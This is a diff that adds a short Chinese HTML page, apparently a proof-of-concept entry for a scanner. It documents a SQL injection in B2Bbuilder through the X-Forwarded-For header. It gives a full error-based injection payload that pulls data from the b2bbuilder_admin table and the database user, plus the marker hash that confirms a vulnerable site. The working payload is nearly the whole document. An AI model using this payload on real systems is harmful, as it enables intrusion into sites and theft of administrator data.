@@ -1,0 +1,9 @@
+<meta charset="UTF-8">
+<div>
+    <h3>SQL注入URL: </h3>
+    <code>http://example.com/index.php</code>
+    <p>修改请求头中的X-Forwarded-For参数为</p>
+    <code>' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,0x27,md5(c),user,0x27,0x7e) from b2bbuilder_admin limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '1'='1</code>
+    <h3>返回结果</h3>
+    <p>查看返回页面源码中是否有字符：4a8a08f09d37b73795649038408b5f33</p>
+</div>
